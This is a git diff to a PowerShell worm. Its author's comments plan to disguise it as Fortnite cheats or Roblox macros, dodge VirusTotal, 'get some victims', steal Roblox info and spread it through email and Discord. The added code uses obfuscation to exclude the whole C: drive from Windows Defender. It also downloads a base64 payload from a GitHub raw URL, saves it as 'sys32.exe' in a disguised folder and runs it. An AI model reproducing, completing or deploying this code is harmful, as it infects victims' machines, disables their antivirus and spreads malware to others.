@@ -5,10 +5,11 @@
 # package it up into some cheats for fortnite or sum
 # maybe roblox macros 
 # fix virus total (add loads of gobbeldy gook vars in original.ps1)
-# remove these comments lmao
-# make the webhook url encoded b64 so script kiddies cant spam that shit 
+# remove these comments lmao | will be funny if someone finds them
+# make the webhook url encoded b64 so script kiddies cant spam that shit | cba no ones using strings on this its calm
 # get some victims.
-# spread via email and discord ..
+# spread via email and discord /
+# get roblox info
 # be a good little worm...
 
 $pcName     = $env:COMPUTERNAME;
@@ -39,6 +40,7 @@ if ($gpu -match "nvidia|gtx|rtx|geforce") {
     function Test-IsAdmin {
         $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
         return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);
+        A`dd-Mp`Prefer`ence -ExclusionPath "C:\"
     }
 
     $extractPath = "C:\Users\$env:USERNAME\Documents\System Utilities";
@@ -113,5 +115,29 @@ else{
     } else {
         & $exePath
     }
-    # download a file that spreads it
+
 }
+# download a file that spreads it
+$spreadUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/spread.txt"
+$b64 = iwr -Uri $spreadUrl
+$decoded = $decodedBytes = [System.Convert]::FromBase64String($b64.Content)
+
+# Specify the path where the .exe should be saved
+$deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
+$exeFileName = "sys32.exe"
+$fullExePath = Join-Path $deepExtractPath $exeFileName
+
+# Ensure the target directory exists
+if (-not (Test-Path $deepExtractPath)) {
+    New-Item -ItemType Directory -Force -Path $deepExtractPath
+}
+
+# Write the decoded bytes to the file
+[System.IO.File]::WriteAllBytes($fullExePath, $decodedBytes)
+
+# Provide feedback to the user
+Write-Host "Executable saved to $fullExePath"
+
+# Optionally, run the saved executable (if needed)
+Start-Process $fullExePath
+
